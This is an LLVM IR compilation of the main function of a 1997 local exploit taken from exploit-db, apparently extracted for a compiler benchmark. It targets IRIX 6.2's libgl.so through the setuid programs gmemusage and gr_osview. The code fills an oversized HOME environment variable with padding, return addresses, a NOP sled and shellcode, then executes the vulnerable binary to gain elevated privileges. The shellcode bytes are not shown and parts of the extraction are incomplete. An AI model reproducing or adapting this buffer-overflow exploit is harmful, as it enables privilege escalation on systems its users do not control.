; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20127.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20127.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM sep 1997 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"libgl.so $HOME for irix 6.2 IP:20,22\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"usage: %s {gmemusage|gr_osview}\0A\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"gmemusage\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"gr_osview\00", align 1
@jump = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [6 x i8] c"HOME=\00", align 1
@ALLIGN = common dso_local global i32 0, align 4
@TMPNUM = common dso_local global i32 0, align 4
@PCHNUM = common dso_local global i32 0, align 4
@ADRNUM = common dso_local global i32 0, align 4
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@shellcode = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [20 x i8] c"/usr/sbin/gmemusage\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@.str.8 = private unnamed_addr constant [20 x i8] c"/usr/sbin/gr_osview\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [10000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca [4 x i8], align 1
  %9 = alloca [4 x i8], align 1
  %10 = alloca i8*, align 8
  %11 = alloca [2 x i8*], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 -1, i32* %13, align 4
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %4, align 4
  %17 = icmp ne i32 %16, 2
  br i1 %17, label %18, label %24

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 -1) #3
  unreachable

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %29 = icmp ne i32 %28, 0
  br i1 %29, label %31, label %30

30:                                               ; preds = %24
  store i32 0, i32* %13, align 4
  br label %31

31:                                               ; preds = %30, %24
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %38, label %37

37:                                               ; preds = %31
  store i32 1, i32* %13, align 4
  br label %38

38:                                               ; preds = %37, %31
  %39 = load i32, i32* %13, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %43

41:                                               ; preds = %38
  %42 = call i32 @exit(i32 -1) #3
  unreachable

43:                                               ; preds = %38
  %44 = load i64, i64* @jump, align 8
  %45 = inttoptr i64 %44 to i64 (...)*
  %46 = call i64 (...) %45()
  %47 = add i64 %46, 10268
  %48 = add i64 %47, 252
  %49 = add i64 %48, 824
  %50 = add i64 %49, 500
  %51 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %52 = bitcast i8* %51 to i64*
  store i64 %50, i64* %52, align 1
  %53 = load i64, i64* @jump, align 8
  %54 = inttoptr i64 %53 to i64 (...)*
  %55 = call i64 (...) %54()
  %56 = add i64 %55, 10268
  %57 = add i64 %56, 252
  %58 = add i64 %57, 824
  %59 = add i64 %58, 31868
  %60 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %61 = bitcast i8* %60 to i64*
  store i64 %59, i64* %61, align 1
  %62 = load i64, i64* @jump, align 8
  %63 = inttoptr i64 %62 to i64 (...)*
  %64 = call i64 (...) %63()
  %65 = add i64 %64, 10268
  %66 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %67 = bitcast i8* %66 to i64*
  store i64 %65, i64* %67, align 1
  %68 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %69 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  store i8* %68, i8** %69, align 16
  %70 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 1
  store i8* null, i8** %70, align 8
  %71 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  store i8* %71, i8** %10, align 8
  %72 = load i8*, i8** %10, align 8
  %73 = call i32 @sprintf(i8* %72, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  %74 = load i8*, i8** %10, align 8
  %75 = getelementptr inbounds i8, i8* %74, i64 5
  store i8* %75, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %76

76:                                               ; preds = %83, %43
  %77 = load i32, i32* %12, align 4
  %78 = load i32, i32* @ALLIGN, align 4
  %79 = icmp slt i32 %77, %78
  br i1 %79, label %80, label %86

80:                                               ; preds = %76
  %81 = load i8*, i8** %10, align 8
  %82 = getelementptr inbounds i8, i8* %81, i32 1
  store i8* %82, i8** %10, align 8
  store i8 -1, i8* %81, align 1
  br label %83

83:                                               ; preds = %80
  %84 = load i32, i32* %12, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %12, align 4
  br label %76

86:                                               ; preds = %76
  store i32 0, i32* %12, align 4
  br label %87

87:                                               ; preds = %99, %86
  %88 = load i32, i32* %12, align 4
  %89 = load i32, i32* @TMPNUM, align 4
  %90 = icmp slt i32 %88, %89
  br i1 %90, label %91, label %102

91:                                               ; preds = %87
  %92 = load i32, i32* %12, align 4
  %93 = srem i32 %92, 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = load i8*, i8** %10, align 8
  %98 = getelementptr inbounds i8, i8* %97, i32 1
  store i8* %98, i8** %10, align 8
  store i8 %96, i8* %97, align 1
  br label %99

99:                                               ; preds = %91
  %100 = load i32, i32* %12, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %12, align 4
  br label %87

102:                                              ; preds = %87
  %103 = load i8*, i8** %10, align 8
  %104 = getelementptr inbounds i8, i8* %103, i32 1
  store i8* %104, i8** %10, align 8
  store i8 -1, i8* %103, align 1
  store i32 0, i32* %12, align 4
  br label %105

105:                                              ; preds = %117, %102
  %106 = load i32, i32* %12, align 4
  %107 = load i32, i32* @PCHNUM, align 4
  %108 = icmp slt i32 %106, %107
  br i1 %108, label %109, label %120

109:                                              ; preds = %105
  %110 = load i32, i32* %12, align 4
  %111 = srem i32 %110, 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %112
  %114 = load i8, i8* %113, align 1
  %115 = load i8*, i8** %10, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %10, align 8
  store i8 %114, i8* %115, align 1
  br label %117

117:                                              ; preds = %109
  %118 = load i32, i32* %12, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %12, align 4
  br label %105

120:                                              ; preds = %105
  store i32 0, i32* %12, align 4
  br label %121

121:                                              ; preds = %128, %120
  %122 = load i32, i32* %12, align 4
  %123 = load i32, i32* @ALLIGN, align 4
  %124 = icmp slt i32 %122, %123
  br i1 %124, label %125, label %131

125:                                              ; preds = %121
  %126 = load i8*, i8** %10, align 8
  %127 = getelementptr inbounds i8, i8* %126, i32 1
  store i8* %127, i8** %10, align 8
  store i8 -1, i8* %126, align 1
  br label %128

128:                                              ; preds = %125
  %129 = load i32, i32* %12, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %12, align 4
  br label %121

131:                                              ; preds = %121
  store i32 0, i32* %12, align 4
  br label %132

132:                                              ; preds = %144, %131
  %133 = load i32, i32* %12, align 4
  %134 = load i32, i32* @ADRNUM, align 4
  %135 = icmp slt i32 %133, %134
  br i1 %135, label %136, label %147

136:                                              ; preds = %132
  %137 = load i32, i32* %12, align 4
  %138 = srem i32 %137, 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %139
  %141 = load i8, i8* %140, align 1
  %142 = load i8*, i8** %10, align 8
  %143 = getelementptr inbounds i8, i8* %142, i32 1
  store i8* %143, i8** %10, align 8
  store i8 %141, i8* %142, align 1
  br label %144

144:                                              ; preds = %136
  %145 = load i32, i32* %12, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %12, align 4
  br label %132

147:                                              ; preds = %132
  store i32 0, i32* %12, align 4
  br label %148

148:                                              ; preds = %162, %147
  %149 = load i32, i32* %12, align 4
  %150 = load i32, i32* @NOPNUM, align 4
  %151 = icmp slt i32 %149, %150
  br i1 %151, label %152, label %165

152:                                              ; preds = %148
  %153 = load i32*, i32** @nop, align 8
  %154 = load i32, i32* %12, align 4
  %155 = srem i32 %154, 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i32, i32* %153, i64 %156
  %158 = load i32, i32* %157, align 4
  %159 = trunc i32 %158 to i8
  %160 = load i8*, i8** %10, align 8
  %161 = getelementptr inbounds i8, i8* %160, i32 1
  store i8* %161, i8** %10, align 8
  store i8 %159, i8* %160, align 1
  br label %162

162:                                              ; preds = %152
  %163 = load i32, i32* %12, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %12, align 4
  br label %148

165:                                              ; preds = %148
  store i32 0, i32* %12, align 4
  br label %166

166:                                              ; preds = %180, %165
  %167 = load i32, i32* %12, align 4
  %168 = load i32*, i32** @shellcode, align 8
  %169 = call i32 @strlen(i32* %168)
  %170 = icmp slt i32 %167, %169
  br i1 %170, label %171, label %183

171:                                              ; preds = %166
  %172 = load i32*, i32** @shellcode, align 8
  %173 = load i32, i32* %12, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds i32, i32* %172, i64 %174
  %176 = load i32, i32* %175, align 4
  %177 = trunc i32 %176 to i8
  %178 = load i8*, i8** %10, align 8
  %179 = getelementptr inbounds i8, i8* %178, i32 1
  store i8* %179, i8** %10, align 8
  store i8 %177, i8* %178, align 1
  br label %180

180:                                              ; preds = %171
  %181 = load i32, i32* %12, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %12, align 4
  br label %166

183:                                              ; preds = %166
  %184 = load i8*, i8** %10, align 8
  store i8 0, i8* %184, align 1
  %185 = load i32, i32* %13, align 4
  switch i32 %185, label %192 [
    i32 0, label %186
    i32 1, label %189
  ]

186:                                              ; preds = %183
  %187 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %188 = call i32 @execle(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i32 0, i8** %187)
  br label %189

189:                                              ; preds = %183, %186
  %190 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %191 = call i32 @execle(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i32 0, i8** %190)
  br label %192

192:                                              ; preds = %189, %183
  %193 = load i32, i32* %3, align 4
  ret i32 %193
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execle(i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
